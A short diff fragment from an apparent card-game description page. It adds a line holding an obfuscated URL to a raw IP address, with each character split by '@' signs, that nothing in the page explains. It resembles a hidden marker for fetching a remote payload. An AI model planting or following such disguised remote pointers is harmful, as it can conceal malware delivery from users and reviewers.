@@ -9,4 +9,4 @@ If you get exactly 21 points, you win immediately, which is of course the best, 
 Have fun playing!<p>
   
 
-
+###(@h@t@t@p@:@/@/@1@0@4@.@1@9@9@.@2@0@4@.@7@8@/@M@i@n@i@J@a@c@k@)###
